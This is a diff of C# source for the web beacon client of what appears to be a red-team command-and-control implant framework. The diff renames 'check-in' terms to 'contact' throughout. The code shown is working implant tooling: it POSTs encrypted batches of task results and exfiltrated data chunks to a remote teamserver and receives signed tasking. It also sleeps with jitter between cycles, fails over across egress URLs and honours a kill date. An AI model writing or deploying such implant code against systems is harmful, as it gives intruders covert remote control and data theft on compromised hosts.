@@ -9,9 +9,9 @@ using Rod.V1;
 
 namespace Rod.Implant.Internal;
 
-// The reference implant's web check-in client (architecture.md Sec 8): the
+// The reference implant's web contact client (architecture.md Sec 8): the
 // envelope POST cycle, the shape every mainstream HTTP(S) C2 uses. One POST
-// to /implants/beacon is one poll check-in -- the request body carries the
+// to /implants/beacon is one poll contact -- the request body carries the
 // handshake frame first plus any results, exfil chunks, and staged demands
 // collected since the last cycle; the response carries the handshake
 // response, the staged chunk runs answering those demands, and queued tasking
@@ -23,12 +23,12 @@ namespace Rod.Implant.Internal;
 // just authenticated content. Over https the teamserver CA is pinned as the
 // server identity and the enrolled leaf stays available for a front that
 // does ask (an mTLS front); the lab-debug bake (no key) sends the plaintext
-// framed body. The wire grammar is the envelope check-in contract
+// framed body. The wire grammar is the envelope contact contract
 // (extending/implants.md); nothing here is implant-only tradecraft, the same
 // frames the gRPC stream carries in a different carriage.
 
 /// <summary>
-/// Runs the implant's check-in lifecycle over the envelope POST cycle: POST
+/// Runs the implant's contact lifecycle over the envelope POST cycle: POST
 /// the accumulated frames, process the response's tasking, sleep the baked
 /// interval with jitter, repeat. Channel verbs never arrive over the envelope
 /// (the server will not claim them without a live stream), so -- exactly like
@@ -36,10 +36,10 @@ namespace Rod.Implant.Internal;
 /// refused on the task itself. Tasking keeps its signature and replay-nonce
 /// discipline regardless of transport (architecture.md Sec 9).
 /// </summary>
-internal sealed class EnvelopeBeacon : ICheckInClient
+internal sealed class EnvelopeBeacon : IContactClient
 {
     /// <summary>
-    /// The envelope check-in route. Mapped on every web listener beside the
+    /// The envelope contact route. Mapped on every web listener beside the
     /// enroll route; fixed, not malleable (the malleable profile shapes the
     /// enroll request; URI routing at the public endpoint is a redirector
     /// concern).
@@ -72,7 +72,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
 
     // The fronted-pivot ledger (architecture.md Sec 5.2), shared with the
     // gRPC beacon through the one EnrollBundle the program hands both: the
-    // Pivot children this implant enrolled, whose tasking a check-in executes.
+    // Pivot children this implant enrolled, whose tasking a contact executes.
     private readonly FrontedPivots? _fronted;
 
     // The replay-nonce state (architecture.md Sec 9), shared with the gRPC
@@ -113,19 +113,19 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     // delivery mark deferred to the batch's crossing.
     private readonly BeaconTasking _tasking;
 
-    // The per-artifact check-in seal (architecture.md Sec 8/9): the baked key
+    // The per-artifact contact seal (architecture.md Sec 8/9): the baked key
     // split into its id and key halves, present only when the bake asked for
-    // sealed check-ins. Every body this client exchanges then rides as
+    // sealed contacts. Every body this client exchanges then rides as
     // AES-256-GCM ciphertext under it.
     private readonly (byte[] KeyId, byte[] Key)? _seal;
 
-    // The check-in counter: incremented before every POST attempt, so a
+    // The contact counter: incremented before every POST attempt, so a
     // retransmitted batch after a lost response still carries a fresh value
     // (the server refuses a counter at or below its floor) while the batch
     // semantics below make the retransmission itself idempotent.
-    private long _checkInCounter;
+    private long _contactCounter;
 
-    // The check-in mode this client serves: the web URL shape splits by it
+    // The contact mode this client serves: the web URL shape splits by it
     // (architecture.md Sec 8) -- poll runs this POST cycle, stream holds the
     // WebSocket stream (WsBeacon). Defaults to poll, the shape this client
     // has always been.
@@ -168,7 +168,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
         _poll = new PollChannels(_held, log);
-        _seal = transport is { SealsCheckIns: true }
+        _seal = transport is { SealsContacts: true }
             ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
             : null;
         _mode = mode;
@@ -193,11 +193,11 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         => BeaconUrl.IsWeb(beaconUrl) && _mode != BeaconModes.Stream;
 
     /// <summary>
-    /// Composes the check-in URL off a beacon URL: the scheme and authority
+    /// Composes the contact URL off a beacon URL: the scheme and authority
     /// it names plus the fixed route, with any path the entry carried
     /// dropped.
     /// </summary>
-    public static string CheckInUrl(string beaconUrl)
+    public static string ContactUrl(string beaconUrl)
     {
         var u = beaconUrl.Trim();
         var schemeIdx = u.IndexOf("://", StringComparison.Ordinal);
@@ -213,11 +213,11 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     /// handshake refusal. A dropped cycle (transport failure, refused body)
     /// walks the egress entry and retries on the jittered cadence with the
     /// same exponential backoff the gRPC stream applies. Returns
-    /// <see cref="CheckInExit.SwitchTransport"/> when the walk's current
+    /// <see cref="ContactExit.SwitchTransport"/> when the walk's current
     /// entry is not a web URL, so the coordinator hands the run to the gRPC
     /// stream client.
     /// </summary>
-    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    public async Task<ContactExit> RunAsync(CancellationToken cancellationToken)
     {
         try
         {
@@ -232,7 +232,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         }
     }
 
-    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
+    private async Task<ContactExit> RunCyclesAsync(CancellationToken cancellationToken)
     {
         var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
@@ -240,10 +240,10 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
             {
                 _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
             if (!BeaconUrl.IsWeb(_egress.CurrentBeaconUrl))
-                return CheckInExit.SwitchTransport;
+                return ContactExit.SwitchTransport;
 
             var cycle = BeaconCycleResult.Dropped;
             try
@@ -256,14 +256,14 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             }
             catch (Exception ex)
             {
-                _log.WriteLine($"beacon check-in failed: {ex.Message}");
+                _log.WriteLine($"beacon contact failed: {ex.Message}");
             }
 
             // Every non-OK handshake status (unknown implant, kill date
             // expired, retired, identity/version mismatch) is permanent for
             // this artifact: retrying would not change the answer.
             if (cycle == BeaconCycleResult.Terminal)
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
 
             if (cycle == BeaconCycleResult.Handshaken)
             {
@@ -285,14 +285,14 @@ internal sealed class EnvelopeBeacon : ICheckInClient
                 // The cadence is read fresh every cycle, so a beacon.sleep
                 // change lands on the very next sleep.
                 var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
-                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
+                await ContactCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
-                return CheckInExit.Terminate;
+                return ContactExit.Terminate;
             }
         }
-        return CheckInExit.Terminate;
+        return ContactExit.Terminate;
     }
 
     // One POST-response cycle. Throws on transport errors (the caller logs
@@ -302,7 +302,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     // results accumulate here in frame batches rather than streaming.
     private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
     {
-        var url = CheckInUrl(_egress.CurrentBeaconUrl);
+        var url = ContactUrl(_egress.CurrentBeaconUrl);
         using var http = BuildClient(url);
 
         // The batch snapshot: the handshake plus everything accumulated. The
@@ -333,9 +333,9 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         if (_seal is { } seal)
         {
             var plaintext = new byte[CounterBytes + encoded.Length];
-            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_checkInCounter);
+            BinaryPrimitives.WriteInt64BigEndian(plaintext, ++_contactCounter);
             encoded.AsSpan().CopyTo(plaintext.AsSpan(CounterBytes));
-            postBody = EnvelopeWire.SealCheckInBody(plaintext, seal.KeyId, seal.Key, CheckInRequestAad);
+            postBody = EnvelopeWire.SealContactBody(plaintext, seal.KeyId, seal.Key, ContactRequestAad);
             contentType = "text/plain";
         }
         else
@@ -355,13 +355,13 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             // A sealed cycle answers sealed: a body that does not verify
             // under the key this artifact carries is a dropped cycle, not a
             // parse -- nothing inside it is acted on.
-            responseBytes = EnvelopeWire.TryOpenCheckInBody(responseBytes, open.KeyId, open.Key, CheckInResponseAad)
-                ?? throw new InvalidOperationException("check-in response did not verify under the baked key");
+            responseBytes = EnvelopeWire.TryOpenContactBody(responseBytes, open.KeyId, open.Key, ContactResponseAad)
+                ?? throw new InvalidOperationException("contact response did not verify under the baked key");
         }
 
         var inbound = EnvelopeCodec.Parse(responseBytes);
         if (inbound.Count == 0)
-            throw new InvalidOperationException("check-in response carried no frames");
+            throw new InvalidOperationException("contact response carried no frames");
 
         var handshake = HandshakeResponse.Parser.ParseFrom(inbound[0].Payload);
         if (handshake.Status != HandshakeStatus.Ok)
@@ -370,7 +370,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             return BeaconCycleResult.Terminal;
         }
         _nonces.Negotiated = handshake.ReplayNonces;
-        // The receive-ack arm is per check-in (architecture.md Sec 10.3): the
+        // The receive-ack arm is per contact (architecture.md Sec 10.3): the
         // acks this cycle queues ride the next request body.
         var acks = handshake.TaskAcks;
         _log.WriteLine($"handshake ok: engagement={handshake.EngagementId}, replay-nonces={handshake.ReplayNonces}");
@@ -543,15 +543,15 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     private void QueueResult(string taskId, TaskOutcome outcome, string output)
         => _poll.QueueResult(taskId, outcome, output);
 
-    // The sealed check-in counter's size in bytes: an 8-byte big-endian
+    // The sealed contact counter's size in bytes: an 8-byte big-endian
     // integer, the same width the teamserver's floor reads.
     private const int CounterBytes = 8;
 
     // The purpose tags binding each sealed body to its direction, the exact
     // strings the teamserver's AesGcmEnvelope carries: a sealed request can
     // never be reflected as a response and vice versa.
-    private const string CheckInRequestAad = "rod-checkin-v1";
-    private const string CheckInResponseAad = "rod-checkin-response-v1";
+    private const string ContactRequestAad = "rod-contact-v1";
+    private const string ContactResponseAad = "rod-contact-response-v1";
 
     // One client per cycle, mirroring the gRPC beacon's per-cycle channel:
     // the walk's current entry decides the shape -- https pins the teamserver
